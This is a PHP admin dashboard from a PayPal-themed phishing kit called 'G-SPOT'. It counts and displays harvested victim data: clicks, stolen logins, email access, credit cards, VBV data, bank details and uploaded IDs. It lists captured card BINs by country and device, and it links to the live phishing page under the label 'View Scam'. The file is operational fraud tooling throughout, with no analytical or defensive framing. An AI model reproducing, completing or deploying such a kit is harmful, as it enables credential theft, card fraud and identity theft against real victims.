<?php

error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
include '../main.php';
function count_c($filename) {
    $file = fopen($filename, "r");
    $jumlahin = fread($file, filesize($filename));
    $jumlahin = substr_count($jumlahin, "\n");
    return $jumlahin;
    fclose($file);
}
$totalvisitor = count_c("../result/total_click.txt");
$totalakun = count_c("../result/total_login.txt");
$totalcc = count_c("../result/total_cc.txt");
$totalvbv = count_c("../result/total_vbv.txt");
$totalbank = count_c("../result/total_bank.txt");
$totalbot = count_c("../result/total_bot.txt");
$totalupload = count_c("../result/total_upload.txt");
$totalemail = count_c("../result/total_email.txt");
?>

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>G-SPOT - Dashboard</title>
    <link rel = "icon" href = "css/basilisk.png" type = "image/x-icon"> 
    <!-- Custom fonts for this template-->
    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link
        href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i"
        rel="stylesheet">

    <!-- Custom styles for this template-->
    <link href="css/sb-admin-2.min.css" rel="stylesheet">
    <script src="https://code.iconify.design/1/1.0.7/iconify.min.js"></script>

</head>
<script>
    window.onload = function() {
Chart.defaults.global.defaultFontFamily = 'Nunito', '-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif';
Chart.defaults.global.defaultFontColor = '#858796';

// Pie Chart Example
var ctx = document.getElementById("myPieChart");
var myPieChart = new Chart(ctx, {
  type: 'doughnut',
  data: {
    labels: ["Total Click", "Login Account", "Email Access", "Credit Card"],
    datasets: [{
      data: [<?= $totalvisitor; ?>,<?= $totalakun; ?>, <?= $totalemail; ?>, <?= $totalcc; ?>],
      backgroundColor: ['#f0ad4e', '#4e73df', '#1cc88a', '#df4759'],
      hoverBackgroundColor: ['#d69a45', '#2e59d9', '#17a673', '#d14354'],
      hoverBorderColor: "rgba(234, 236, 244, 1)",
    }],
  },
  options: {
    maintainAspectRatio: false,
    tooltips: {
      backgroundColor: "rgb(255,255,255)",
      bodyFontColor: "#858796",
      borderColor: '#dddfeb',
      borderWidth: 1,
      xPadding: 15,
      yPadding: 15,
      displayColors: false,
      caretPadding: 10,
    },
    legend: {
      display: false
    },
    cutoutPercentage: 80,
  },
});
chart.render();
 
}
</script>
<body id="page-top">

    <!-- Page Wrapper -->
    <div id="wrapper">

        <!-- Sidebar -->
        <ul class="navbar-nav bg-gradient-dark sidebar sidebar-dark accordion" id="accordionSidebar">

            <!-- Sidebar - Brand -->
            <a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.html">
                <div class="sidebar-brand-icon">
                <i class="iconify fa-2x" data-icon="logos:paypal"></i>
                </div>
                <div class="sidebar-brand-text mx-3">G-SPOT <sup>VIP <span class="iconify" data-icon="noto:crown" data-inline="false"></span></sup></div>
            </a>

            <!-- Divider -->
            <hr class="sidebar-divider my-0">

            <!-- Nav Item - Dashboard -->
            <li class="nav-item active">
                <a class="nav-link" href="index.php">
                    <i class="fas fa-fw fa-tachometer-alt"></i>
                    <span>Dashboard</span></a>
            </li>

            <!-- Divider -->
            <hr class="sidebar-divider">

            <!-- Heading -->
            <div class="sidebar-heading">
                Interface
            </div>

            <!-- Nav Item - Pages Collapse Menu -->
            <li class="nav-item">
                <a class="nav-link" href="setting.php">
                    <i class="fas fa-fw fa-cogs"></i>
                    <span>General Setting</span></a>
            </li>

            <!-- Nav Item - Utilities Collapse Menu -->
            <li class="nav-item">
                <a class="nav-link" href="antibot.php">
                    <i class="fas fa-fw fa-robot"></i>
                    <span>Antibot Setting</span></a>
            </li>

            <!-- Divider -->
            <hr class="sidebar-divider">

            <!-- Heading -->
            <div class="sidebar-heading">
                Addons
            </div>

            <!-- Nav Item - Charts -->
            <li class="nav-item">
                <a class="nav-link" href="bot.php">
                    <i class="fas fa-fw fa-bug"></i>
                    <span>Bot Detect</span></a>
            </li>

            <!-- Nav Item - Tables -->
            <li class="nav-item">
                <a class="nav-link" href="clear.php">
                    <i class="fas fa-fw fa-trash-alt"></i>
                    <span>Clear logs</span></a>
            </li>

            <!-- Divider -->
            <hr class="sidebar-divider d-none d-md-block">

            <!-- Sidebar Toggler (Sidebar) -->
            <div class="text-center d-none d-md-inline">
                <button class="rounded-circle border-0" id="sidebarToggle"></button>
            </div>

            <!-- Sidebar Message -->
            <div class="sidebar-card">
                <img class="sidebar-card-illustration mb-2" src="img/undraw_rocket.svg" alt="">
                <p class="text-center mb-2 text-white"><strong>G-SPOT</strong> make sure what's belong to you is yours!</p>
                <a class="btn btn-dark btn-sm" href="#">By St. Jordi</a>
            </div>

        </ul>
        <!-- End of Sidebar -->

        <!-- Content Wrapper -->
        <div id="content-wrapper" class="d-flex flex-column">

            <!-- Main Content -->
            <div id="content">

                <!-- Topbar -->
                <nav class="navbar navbar-expand navbar-dark bg-dark topbar mb-4 static-top shadow">

                    <!-- Sidebar Toggle (Topbar) -->
                    <button id="sidebarToggleTop" class="btn btn-link d-md-none rounded-circle mr-3">
                        <i class="fa fa-bars"></i>
                    </button>

                    <!-- Topbar Navbar -->
                    <ul class="navbar-nav ml-auto">

                        <div class="topbar-divider d-none d-sm-block"></div>

                        <!-- Nav Item - User Information -->
                        <li class="nav-item dropdown no-arrow">
                            <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <span class="mr-2 d-none d-lg-inline text-gray-600 small"><font color="white">G-SPOT Member</font></span>
                                <img class="img-profile rounded-circle"
                                    src="img/undraw_profile.svg">
                            </a>
                            <!-- Dropdown - User Information -->
                            <div class="dropdown-menu dropdown-menu-right shadow animated--grow-in"
                                aria-labelledby="userDropdown">
                                <a class="dropdown-item" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?=$site_parameter;?>" data-toggle="modal" data-target="#logoutModal">
                                    <i class="fas fa-sign-out-alt fa-sm fa-fw mr-2 text-red-400"></i>
                                    View Scam
                                </a>
                            </div>
                        </li>

                    </ul>

                </nav>
                <!-- End of Topbar -->

                <!-- Begin Page Content -->
                <div class="container-fluid">

                    <!-- Page Heading -->
                    <div class="d-sm-flex align-items-center justify-content-between mb-4">
                        <h1 class="h3 mb-0 text-gray-800">Dashboard <span class="iconify" data-icon="fxemoji:crown" data-inline="false"></span></h1>
                    </div>

                    <!-- Content Row -->
                    <div class="row">

                    <div class="col-xl-3 col-md-6 mb-4">
                            <div class="card border-left-warning shadow h-100 py-2">
                                <div class="card-body">
                                    <div class="row no-gutters align-items-center">
                                        <div class="col mr-2">
                                            <div class="text-md font-weight-bold text-warning text-uppercase mb-1">
                                                Total Click</div>
                                            <div class="h4 mb-0 font-weight-bold text-gray-800"><?php echo empty(@file_get_contents("../result/total_click.txt")) ? "0" : $totalvisitor; ?></div>
                                        </div>
                                        <div class="col-auto">
                                        <i class="fas fa-mouse-pointer text-warning fa-3x"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Earnings (Monthly) Card Example -->
                        <div class="col-xl-3 col-md-6 mb-4">
                            <div class="card border-left-primary shadow h-100 py-2">
                                <div class="card-body">
                                    <div class="row no-gutters align-items-center">
                                        <div class="col mr-2">
                                            <div class="text-md font-weight-bold text-primary text-uppercase mb-1">
                                                Login Account</div>
                                            <div class="h4 mb-0 font-weight-bold text-gray-800"><?php echo empty(@file_get_contents("../result/total_login.txt")) ? "0" : $totalakun; ?></div>
                                        </div>
                                        <div class="col-auto">
                                        <i class="fas fa-sign-in-alt text-primary fa-3x"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Earnings (Monthly) Card Example -->
                        <div class="col-xl-3 col-md-6 mb-4">
                            <div class="card border-left-success shadow h-100 py-2">
                                <div class="card-body">
                                    <div class="row no-gutters align-items-center">
                                        <div class="col mr-2">
                                        <div class="text-md font-weight-bold text-success text-uppercase mb-1">
                                                Email Access</div>
                                            <div class="h4 mb-0 font-weight-bold text-gray-800"><?php echo empty(@file_get_contents("../result/total_email.txt")) ? "0" : $totalemail; ?></div>
                                        </div>
                                        <div class="col-auto">
                                        <i class="fas fa-envelope text-success fa-3x"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Pending Requests Card Example -->
                        <div class="col-xl-3 col-md-6 mb-4">
                            <div class="card border-left-danger shadow h-100 py-2">
                                <div class="card-body">
                                    <div class="row no-gutters align-items-center">
                                        <div class="col mr-2">
                                            <div class="text-md font-weight-bold text-danger text-uppercase mb-1">
                                                Credit Card</div>
                                            <div class="h4 mb-0 font-weight-bold text-gray-800"><?php echo empty(@file_get_contents("../result/total_cc.txt")) ? "0" : $totalcc; ?></div>
                                        </div>
                                        <div class="col-auto">
                                        <i class="fas fa-credit-card text-danger fa-3x"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">

<div class="col-xl-3 col-md-6 mb-4">
        <div class="card border-left-info shadow h-100 py-2">
            <div class="card-body">
                <div class="row no-gutters align-items-center">
                    <div class="col mr-2">
                        <div class="text-md font-weight-bold text-info text-uppercase mb-1">
                            Total Bank</div>
                        <div class="h4 mb-0 font-weight-bold text-gray-800"><?php echo empty(@file_get_contents("../result/total_bank.txt")) ? "0" : $totalbank; ?></div>
                    </div>
                    <div class="col-auto">
                    <i class="fas fa-university text-info fa-3x"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Earnings (Monthly) Card Example -->
    <div class="col-xl-3 col-md-6 mb-4">
        <div class="card border-left-secondary shadow h-100 py-2">
            <div class="card-body">
                <div class="row no-gutters align-items-center">
                    <div class="col mr-2">
                        <div class="text-md font-weight-bold text-secondary text-uppercase mb-1">
                            Total VBV</div>
                        <div class="h4 mb-0 font-weight-bold text-gray-800"><?php echo empty(@file_get_contents("../result/total_vbv.txt")) ? "0" : $totalakun; ?></div>
                    </div>
                    <div class="col-auto">
                    <i class="fas fa-th-large text-secondary fa-3x"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Earnings (Monthly) Card Example -->
    <div class="col-xl-3 col-md-6 mb-4">
        <div class="card border-left-dark shadow h-100 py-2">
            <div class="card-body">
                <div class="row no-gutters align-items-center">
                    <div class="col mr-2">
                    <div class="text-md font-weight-bold text-dark text-uppercase mb-1">
                            Upload ID</div>
                        <div class="h4 mb-0 font-weight-bold text-gray-800"><?php echo empty(@file_get_contents("../result/total_upload.txt")) ? "0" : $totalupload; ?></div>
                    </div>
                    <div class="col-auto">
                    <i class="fas fa-id-card text-dark fa-3x"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Pending Requests Card Example -->
    <div class="col-xl-3 col-md-6 mb-4">
        <div class="card border-left-secondary shadow h-100 py-2">
            <div class="card-body">
                <div class="row no-gutters align-items-center">
                    <div class="col mr-2">
                        <div class="text-md font-weight-bold text-dark text-uppercase mb-1">
                            Total BOT</div>
                        <div class="h4 mb-0 font-weight-bold text-gray-800"><?php echo empty(@file_get_contents("../result/total_bot.txt")) ? "0" : $totalbot; ?></div>
                    </div>
                    <div class="col-auto">
                    <i class="fas fa-user-times text-dark fa-3x"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

                    <!-- Content Row -->
                    <div class="row">
                        <div class="col-xl col-lg-5">
                            <div class="card shadow mb-4">
                                <!-- Card Header - Dropdown -->
                                <div
                                    class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                                    <h6 class="m-0 font-weight-bold text-primary"><strong>BIN LOGS</strong> ( <font style="color:red;display:inline-block;"><?php echo empty(@file_get_contents("../result/total_cc.txt")) ? "0" : $totalcc; ?></font> )</h6>
                                    <div class="dropdown no-arrow">
                                        <a class="dropdown-toggle" href="#" role="button" id="dropdownMenuLink"
                                            data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                            <i class="fas fa-ellipsis-v fa-sm fa-fw text-gray-400"></i>
                                        </a>
                                    </div>
                                </div>
                                <!-- Card Body -->
                                <div class="card-body">
                                <table class="table table-bordered table-striped table-hover">
                      <tr>
                                                <th><strong>Country</strong></th>
                                                <th><strong>BIN</strong></th>
                                                <th><strong>Device</strong></th>
                      </tr>
                      <tbody>
                    <?php
if(file_exists("../result/total_bin.txt")){
                                            $bin = file_get_contents("../result/total_bin.txt");
                                            $bin = explode("\n", $bin);
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $name = $bins[0];
                                                $code = $bins[1];
                                                $country = $bins[2];
                                                $device = $bins[3];
                                                if($name == "") {

                                                }else{
                                                echo "<tr>
                                                <td><img src='https://www.countryflags.io/".$code."/flat/16.png'> ".$country."</td>
                                                <td>".$name."</td>
                                                <td>".$device."</td>
                                                </tr>";
                          }
                        } 
                      } else {
                          echo "<tr><td>Not found</td><td></td><td></td></tr>";
                        }
                    ?>
                  </tbody>

                    </table>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Content Row -->

                    <div class="row">

                        <!-- Pie Chart -->
                        <div class="col-xl col-lg-5">
                            <div class="card shadow mb-4">
                                <!-- Card Header - Dropdown -->
                                <div
                                    class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                                    <h6 class="m-0 font-weight-bold text-primary">Presentase Result</h6>
                                    <div class="dropdown no-arrow">
                                        <a class="dropdown-toggle" href="#" role="button" id="dropdownMenuLink"
                                            data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                            <i class="fas fa-ellipsis-v fa-sm fa-fw text-gray-400"></i>
                                        </a>
                                        <div class="dropdown-menu dropdown-menu-right shadow animated--fade-in"
                                            aria-labelledby="dropdownMenuLink">
                                            <div class="dropdown-header">Dropdown Header:</div>
                                            <a class="dropdown-item" href="#">Action</a>
                                            <a class="dropdown-item" href="#">Another action</a>
                                            <div class="dropdown-divider"></div>
                                            <a class="dropdown-item" href="#">Something else here</a>
                                        </div>
                                    </div>
                                </div>
                                <!-- Card Body -->
                                <div class="card-body">
                                    <div class="chart-pie pt-4 pb-2">
                                        <canvas id="myPieChart"></canvas>
                                    </div>
                                    <div class="mt-4 text-center small">
                                        <span class="mr-2">
                                            <i class="fas fa-circle text-warning"></i> Total Click
                                        </span>
                                        <span class="mr-2">
                                            <i class="fas fa-circle text-primary"></i> Login Account
                                        </span>
                                        <span class="mr-2">
                                            <i class="fas fa-circle text-success"></i> Email Access
                                        </span>
                                        <span class="mr-2">
                                            <i class="fas fa-circle text-danger"></i> Credit Card
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                        </div>

                        
                    </div>

                </div>
                <!-- /.container-fluid -->

            </div>
            <!-- End of Main Content -->

            <!-- Footer -->
            <footer class="sticky-footer bg-dark">
                <div class="container my-auto">
                    <div class="copyright text-center my-auto text-light">
                        <span>Copyright &copy; G-SPOT by St. Jordi</span>
                    </div>
                </div>
            </footer>
            <!-- End of Footer -->

        </div>
        <!-- End of Content Wrapper -->

    </div>
    <!-- End of Page Wrapper -->

    <!-- Scroll to Top Button-->
    <a class="scroll-to-top rounded" href="#page-top">
        <i class="fas fa-angle-up"></i>
    </a>

    <!-- Bootstrap core JavaScript-->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Core plugin JavaScript-->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

    <!-- Custom scripts for all pages-->
    <script src="js/sb-admin-2.min.js"></script>

    <!-- Page level plugins -->
    <script src="vendor/chart.js/Chart.min.js"></script>

    <!-- Page level custom scripts -->
    <script src="js/demo/chart-area-demo.js"></script>
    <script src="https://canvasjs.com/assets/script/canvasjs.min.js"></script>
</body>

</html>